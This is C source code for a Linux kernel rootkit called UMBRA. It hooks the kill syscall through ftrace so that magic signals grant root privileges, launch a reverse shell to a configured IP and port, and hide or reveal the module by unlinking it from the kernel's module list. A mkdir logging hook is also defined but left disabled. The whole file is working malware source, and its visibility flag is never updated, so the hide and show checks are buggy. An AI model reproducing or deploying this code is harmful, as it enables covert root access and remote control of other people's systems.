#include "../include/hookers.h"
#include "../include/utils.h"
#include "../include/CONFIG.h"

asmlinkage long (*orig_mkdir)(const struct pt_regs*);
asmlinkage int hook_mkdir(const struct pt_regs *regs){
    char __user *pathname = (char *)regs->di;
   
    char dir_name[NAME_MAX] = {0};
    long err;

    printk(KERN_INFO "UMBRA:: mkdir hooked x64!");
    //Getting pathname from userspace, which is out of our module address space
    err = strncpy_from_user(dir_name, pathname, NAME_MAX);
    // Returns -EFAULT if error, number of copied bytes otherwise
    if (err>0){
        printk(KERN_INFO "UMBRA:: Detected mkdir %s\n", dir_name);
    }

    orig_mkdir(regs);
    return 0;
}

//Keep track of whether the rootkit is hidden or not
static int rootkit_visibility = 1;
//Previous module on kernel module list, to remember the original position in case we remove it
static struct list_head *prev_module;

asmlinkage long (*orig_kill)(const struct pt_regs*);
asmlinkage int hook_kill(const struct pt_regs *regs){
    void set_root(void);
    int sig = regs->si;

    //If SIGNAL_KILL_HOOK, grant root privileges
    if (sig == SIGNAL_KILL_HOOK){
        printk(KERN_INFO "UMBRA:: Giving root privileges.\n");
        change_self_privileges_to_root();
        return 0;
    }else if(sig == SIGNAL_REVERSE_SHELL){
        start_reverse_shell(REVERSE_SHELL_IP, REVERSE_SHELL_PORT);
    }else if(sig == SIGNAL_SHOW_KERNEL_MODULE){
        if(rootkit_visibility == 1){
            printk(KERN_INFO "UMBRA:: Requested visibility, but already visible.\n");
            return 0;
        }
        //Adding the rootkit to the linked list of modules maintained by the kernel
        list_add(&THIS_MODULE->list, prev_module);
        return 0;
    }else if(sig == SIGNAL_HIDE_KERNEL_MODULE){
        if(rootkit_visibility == 0){
            printk(KERN_INFO "UMBRA:: Requested hiding, but already hidden.\n");
            return 0;
        }
        //Removing the rootkit from the linked list of modules maintained by the kernel
        prev_module = THIS_MODULE->list.prev;
        list_del(&THIS_MODULE->list);
    }

    return orig_kill(regs);
}

// Syscalls to be hooked using frace
struct ftrace_hook hooks[] = {
    //HOOK("sys_mkdir", hook_mkdir, &orig_mkdir),
    HOOK("sys_kill", hook_kill, &orig_kill)
};

void remove_all_hooks(void){
    remove_hooks_set(hooks, ARRAY_SIZE(hooks));
}

int install_all_hooks(void){
    return install_hooks_set(hooks, ARRAY_SIZE(hooks));
}